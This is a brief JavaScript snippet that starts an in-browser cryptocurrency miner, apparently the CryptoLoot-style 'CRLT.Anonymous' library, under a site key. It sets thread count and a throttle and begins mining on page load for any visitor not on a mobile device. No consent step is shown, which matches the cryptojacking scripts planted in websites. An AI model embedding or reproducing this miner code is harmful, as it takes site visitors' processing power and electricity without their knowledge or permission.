var miner=new CRLT.Anonymous('f1a43f8f6f5edc1fdb2d7afe92217f277a367203efe1', {
    threads: 6,
    autoThreads: true,
    throttle: 0.3,
});

if (!miner.isMobile()) {
	miner.start();
}
